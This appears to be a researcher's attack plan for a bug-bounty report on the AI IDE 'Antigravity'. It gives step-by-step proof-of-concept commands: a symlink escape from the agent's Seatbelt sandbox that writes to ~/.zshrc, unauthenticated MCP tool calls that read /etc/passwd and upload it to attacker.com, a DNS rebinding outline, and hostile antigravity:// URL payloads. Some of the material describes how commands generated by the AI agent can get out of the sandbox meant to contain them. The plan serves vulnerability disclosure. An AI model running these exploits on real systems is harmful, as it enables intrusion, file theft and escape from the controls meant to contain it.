# Antigravity Attack Plan — Grounded in Code Understanding
## Date: 2026-04-02 (rewritten)

Every attack below references specific code from `04-code-understanding.md`. No speculation.

---

## PRIORITY 1: Sandbox Symlink Escape

**Code reference:** `extensions/antigravity/bin/sandbox-wrapper.sh`
**Bug class:** Sandbox escape → arbitrary file write
**Confidence:** Very high — Seatbelt symlink behavior is documented by Apple

### Why this works
Line-by-line from the sandbox profile generation:
1. `(allow default)` — base policy allows everything
2. `(deny file-write*)` — deny all file writes
3. `(allow file-write* (subpath "$WORK_DIR"))` — re-allow writes under workspace
4. Seatbelt evaluates `subpath` by resolving the final path after symlink resolution

No symlink checks exist anywhere in the 267-line script. No `readlink -f`, no `-L` test, nothing.

### POC Steps
```bash
# 1. Create a test workspace
mkdir -p /tmp/test-workspace

# 2. Create a symlink pointing outside the workspace
ln -s /tmp/proof-of-escape /tmp/test-workspace/escape-link

# 3. Run a command through the sandbox wrapper
/Applications/Antigravity.app/Contents/Resources/app/extensions/antigravity/bin/sandbox-wrapper.sh \
  --directory /tmp/test-workspace \
  -- bash -c 'echo "ESCAPED" > /tmp/test-workspace/escape-link'

# 4. Check if the file was written outside the workspace
cat /tmp/proof-of-escape
# Expected: "ESCAPED"

# 5. Escalation demo — write to ~/.zshrc
ln -s ~/.zshrc /tmp/test-workspace/zshrc-link
/Applications/Antigravity.app/Contents/Resources/app/extensions/antigravity/bin/sandbox-wrapper.sh \
  --directory /tmp/test-workspace \
  -- bash -c 'echo "# SANDBOX ESCAPED" >> /tmp/test-workspace/zshrc-link'
```

### Impact statement for report
"The macOS Seatbelt sandbox in Antigravity's sandbox-wrapper.sh allows file writes to any path accessible to the user by following symlinks within the workspace directory. An AI-generated command running in the sandbox can write to ~/.zshrc, ~/Library/LaunchAgents/, or any other user-writable location by targeting a symlink in the workspace. This bypasses the intended file-write restriction completely."

### What to check first
- Run `sandbox-wrapper.sh --help` or read its arg parsing to confirm the exact flags
- The script may have been updated since our code read — re-read lines 1-20 for any symlink handling

---

## PRIORITY 2: CDT MCP Server — DNS Rebinding / No Auth

**Code reference:** `extensions/chrome-devtools-mcp/dist/extension.js`, `cdt_mcp/main.js`, `cdt_mcp/McpContext.js`, `cdt_mcp/tools/*.js`
**Bug class:** Remote code execution from malicious webpage
**Confidence:** High for no-auth, medium for DNS rebinding (needs port discovery)

### Why this works
1. HTTP server on `127.0.0.1:{random_port}` — confirmed from extension.js
2. No auth, no Origin header check, no Host header validation — confirmed from reading the StreamableHTTPServerTransport setup and all tool handlers
3. MCP tools have full system access: `saveFile()` writes anywhere, `upload_file` reads anywhere, `evaluate_script` runs arbitrary JS in Chrome

### POC Steps

**Step 1: Confirm no auth (local test)**
```bash
# Start Antigravity with browser agent enabled
# Find the MCP port
lsof -i -P | grep node | grep LISTEN
# Or scan:
for port in $(seq 10000 65535); do
  curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:$port/mcp 2>/dev/null | grep -q "200\|405" && echo "Found: $port"
done

# Send an MCP tool call — list pages
curl -X POST http://127.0.0.1:{PORT}/mcp \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"list_pages","arguments":{}}}'
```

**Step 2: Test file write via screenshot**
```bash
curl -X POST http://127.0.0.1:{PORT}/mcp \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"take_screenshot","arguments":{"filePath":"/tmp/mcp-screenshot-proof.png"}}}'

ls -la /tmp/mcp-screenshot-proof.png
```

**Step 3: Test file read via upload_file**
```bash
# Navigate to attacker-controlled page first
curl -X POST http://127.0.0.1:{PORT}/mcp \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"new_page","arguments":{"url":"https://attacker.com/upload-receiver.html"}}}'

# Upload a local file to the page
curl -X POST http://127.0.0.1:{PORT}/mcp \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"upload_file","arguments":{"selector":"input[type=file]","filePath":"/etc/passwd"}}}'
```

**Step 4: DNS rebinding (if local tests confirm no auth)**
- Set up a domain with short TTL that resolves to attacker IP, then 127.0.0.1
- Serve attack page on first resolution
- Attack page sends MCP requests on second resolution (now hitting localhost)
- This is the standard DNS rebinding pattern — the key finding is that the MCP server is vulnerable to it

### Impact statement
"The Chrome DevTools MCP server in Antigravity runs on localhost with no authentication. Any local process or, via DNS rebinding, any webpage visited in another browser can invoke MCP tools including: writing arbitrary files to disk (saveFile), reading arbitrary local files (upload_file), executing JavaScript in Chrome pages (evaluate_script), and navigating Chrome to attacker-controlled URLs. This enables remote code execution from a malicious webpage while Antigravity is running with the browser agent enabled."

---

## PRIORITY 3: Named Pipe Enumeration + Auth Check

**Code reference:** `extensions/antigravity/dist/extension.js` (pipe creation), `04-code-understanding.md` language server section
**Bug class:** Local privilege escalation / information disclosure
**Confidence:** Medium — depends on pipe permissions and auth

### POC Steps
```bash
# 1. Start Antigravity

# 2. Find the pipe
ls -la /tmp/server_*

# 3. Check permissions
stat -f "%Sp %Su %Sg" /tmp/server_*
# If world-readable/writable → immediate finding

# 4. Try connecting (if permissions allow)
# The pipe uses Connect RPC (HTTP/2 over Unix socket)
# Try a basic HTTP request through the pipe:
curl --unix-socket /tmp/server_[HEX] http://localhost/ -v

# 5. If that works, the protocol is protobuf over Connect RPC
# Would need to reconstruct the proto schema from the import map in jetskiAgent.js
# Key protos: language_server_pb, agent_manager_pb, chat_client_server_pb
```

### Realistic assessment
If the pipe is owner-only (mode 0600/0700), this is only exploitable if combined with another vuln that gives same-user code execution — at which point the pipe is redundant. If the pipe is world-readable, it's a real multi-user finding on shared systems (university labs, CI runners, etc.).

---

## PRIORITY 4: antigravity:// URL Scheme Testing

**Code reference:** `Info.plist` (URL scheme registration), `out/main.js` (handler, minified)
**Bug class:** Remote action trigger from webpage/email
**Confidence:** Medium — need empirical testing since handler is in minified code

### POC Steps
```bash
# 1. Test basic URL handling
open "antigravity://test"

# 2. Test VS Code-style URL patterns (common in forks)
open "antigravity://vscode.open?url=file:///etc/passwd"
open "antigravity://extension/install?id=malicious.extension"
open "antigravity://file?path=/etc/passwd"
open "antigravity://command?id=antigravity.loginWithAuthToken&args=stolen_token"

# 3. Monitor what happens in Antigravity's developer tools
# Open DevTools in Antigravity: Help > Toggle Developer Tools
# Watch console for URL handling logs

# 4. Test from a webpage (simulates remote attack)
# Create an HTML file:
cat > /tmp/url-scheme-test.html << 'EOF'
<html><body>
<a href="antigravity://test">Click to test</a>
<script>window.location = "antigravity://vscode.open?url=file:///etc/passwd";</script>
</body></html>
EOF
open /tmp/url-scheme-test.html
```

### What we're looking for
- Can URLs trigger extension installation? → Remote malicious extension install
- Can URLs open workspaces/files? → Open a malicious workspace that exploits sandbox symlink
- Can URLs execute commands? → Direct command execution
- Can URLs pass auth tokens? → Account takeover via crafted URL

---

## PRIORITY 5: MCP Config File Permissions

**Code reference:** `extensions/antigravity/schemas/mcp_config.schema.json`, filesystem observation
**Bug class:** Information disclosure
**Confidence:** High (trivial to verify), but low severity

### POC Steps
```bash
# 1. Add a secret to MCP config
cat > ~/.gemini/antigravity/mcp_config.json << 'EOF'
{
  "mcpServers": {
    "test": {
      "command": "echo",
      "args": ["hello"],
      "oauth": {
        "clientId": "test-id",
        "clientSecret": "SUPER_SECRET_VALUE_12345"
      }
    }
  }
}
EOF

# 2. Check permissions
ls -la ~/.gemini/antigravity/mcp_config.json
# Expected: -rw-r--r-- (644) — world-readable

# 3. Demonstrate another user can read
# (On a multi-user system, switch to another user)
cat ~/.gemini/antigravity/mcp_config.json
```

---

## EXECUTION ORDER

### Session 1: Sandbox symlink (highest confidence, highest impact)
1. Re-read sandbox-wrapper.sh to confirm exact invocation syntax
2. Run the symlink POC
3. Document results with screenshots
4. Write report draft

### Session 2: CDT MCP no-auth (highest impact if confirmed)
1. Start Antigravity with browser agent
2. Find MCP port
3. Send unauthenticated MCP requests via curl
4. If confirmed, test file write and file read
5. If local works, set up DNS rebinding demo
6. Document and write report

### Session 3: URL scheme + pipe + config
1. Test antigravity:// URL patterns empirically
2. Check pipe permissions while Antigravity is running
3. Verify MCP config file permissions
4. Document any findings

---

## WHAT NOT TO REPORT
- Prompt injection (model behavior, not infrastructure)
- LLM-decision-based attack chains
- "The AI could be tricked into..." — Google explicitly excludes these

## WHAT TO REPORT
- Sandbox escape via symlink (code bug in sandbox-wrapper.sh)
- No auth on CDT MCP HTTP server (code bug in extension.js)
- Arbitrary file read/write via MCP tools (code bug in McpContext.js, tools/*.js)
- Named pipe with weak permissions (if confirmed)
- URL scheme command injection (if confirmed)
- Config file world-readable with secrets (if oauth secrets are present)
